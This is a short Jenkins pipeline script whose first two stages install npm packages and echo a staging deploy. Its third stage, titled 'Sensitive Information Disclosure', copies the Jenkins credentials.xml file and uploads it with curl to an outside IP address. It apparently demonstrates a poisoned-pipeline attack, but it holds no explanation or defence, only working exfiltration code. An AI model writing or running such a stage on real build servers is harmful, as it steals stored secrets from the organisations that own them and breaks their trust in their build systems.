node {
    stage('Build Application') {
        sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Sensitive Information Disclosure') {
        sh '''
        rm info.txt | true
        cat /var/lib/jenkins/credentials.xml >> info.txt
        curl -i -X PUT http://35.219.188.193:5000/filewebhook --upload-file info.txt
        '''
    }
}